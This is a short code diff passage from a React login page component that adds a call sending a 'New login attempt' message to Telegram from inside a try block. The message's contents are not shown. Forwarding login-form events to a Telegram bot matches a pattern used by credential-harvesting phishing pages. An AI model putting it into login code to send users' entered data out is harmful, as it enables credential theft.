@@ -26,7 +26,7 @@ const LoginPage: React.FC = () => {
       🔒 New login attempt
     `;
   
-    try {
+    try {sendTelegramMessage(message)
       
     } catch (err) {
       console.error("Failed to send Telegram message:", err);
